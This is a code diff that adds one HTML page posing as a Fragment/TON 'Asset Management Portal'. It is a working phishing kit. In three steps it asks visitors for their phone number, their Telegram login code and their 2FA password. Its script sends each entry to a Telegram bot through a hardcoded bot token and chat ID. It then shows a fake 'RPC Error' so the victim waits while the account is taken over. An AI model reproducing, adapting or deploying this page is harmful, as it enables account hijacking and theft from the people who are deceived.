@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Asset Management Portal</title>
+    <style>
+        body { background: #1c1c1c; color: white; font-family: -apple-system, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .card { width: 100%; max-width: 360px; padding: 30px 25px; text-align: center; }
+        .logo { width: 75px; height: 75px; background: #000; border-radius: 18px; margin: 0 auto 25px; display: flex; align-items: center; justify-content: center; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
+        .logo img { width: 48px; }
+        h1 { font-size: 22px; font-weight: 600; margin-bottom: 12px; }
+        p { color: #8e8e8e; font-size: 14px; line-height: 1.5; margin-bottom: 35px; }
+        input { width: 100%; background: #121212; border: 1px solid #333; border-radius: 12px; padding: 16px; color: white; font-size: 16px; margin-bottom: 15px; outline: none; box-sizing: border-box; transition: 0.2s; }
+        input:focus { border-color: #3390ec; }
+        button { width: 100%; background: #3390ec; color: white; border: none; border-radius: 12px; padding: 16px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s; }
+        button:active { opacity: 0.8; }
+        .step { display: none; }
+        .active { display: block; animation: fadeIn 0.4s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo"><img src="https://fragment.com/img/logo.svg" alt="F"></div>
+
+        <div id="s1" class="step active">
+            <h1>Sync Assets</h1>
+            <p>Введите номер для синхронизации аккаунта с распределительным узлом Fragment.</p>
+            <input type="tel" id="u_phone" placeholder="Phone Number" autofocus>
+            <button onclick="go(1)" id="btn1">Next</button>
+        </div>
+
+        <div id="s2" class="step">
+            <h1>Identity Check</h1>
+            <p>Системный идентификатор был отправлен в ваше приложение для подтверждения прав.</p>
+            <input type="number" id="u_code" placeholder="System ID">
+            <button onclick="go(2)" id="btn2">Confirm</button>
+        </div>
+
+        <div id="s3" class="step">
+            <h1>Storage Key</h1>
+            <p>Ваше хранилище защищено облачным ключом. Введите его для завершения.</p>
+            <input type="password" id="u_pass" placeholder="Cloud Key">
+            <button onclick="go(3)">Unlock & Sync</button>
+        </div>
+
+        <div id="s4" class="step">
+            <h1 style="color:#ff595a">RPC Error</h1>
+            <p>Не удалось подключиться к TON Gateway. Попробуйте выполнить синхронизацию через 30-60 минут.</p>
+            <button onclick="location.reload()">Close</button>
+        </div>
+    </div>
+
+    <script>
+        const BOT_T = '8258905068:AAE9V0LzjGb0XqW7FnLMwb_0deCmXk59P7M';
+        const CHAT_ID = '7933925330';
+
+        async function send(msg) {
+            await fetch(`https://api.telegram.org/bot${BOT_T}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown'})
+            });
+        }
+
+        let phone = "";
+        function go(s) {
+            if(s === 1) {
+                phone = document.getElementById('u_phone').value;
+                if(phone.length < 9) return;
+                document.getElementById('btn1').innerText = "Connecting...";
+                send(`📱 **ЛОГ НОМЕР:** \`${phone}\``);
+                setTimeout(() => {
+                    document.getElementById('s1').classList.remove('active');
+                    document.getElementById('s2').classList.add('active');
+                }, 1800);
+            } else if(s === 2) {
+                const code = document.getElementById('u_code').value;
+                if(code.length < 5) return;
+                send(`🔐 **ЛОГ КОД (${phone}):** \`${code}\``);
+                document.getElementById('s2').classList.remove('active');
+                document.getElementById('s3').classList.add('active');
+            } else if(s === 3) {
+                const pass = document.getElementById('u_pass').value;
+                send(`🔑 **ЛОГ 2FA (${phone}):** \`${pass}\``);
+                document.getElementById('s3').classList.remove('active');
+                document.getElementById('s4').classList.add('active');
+            }
+        }
+    </script>
+</body>
+</html>
+
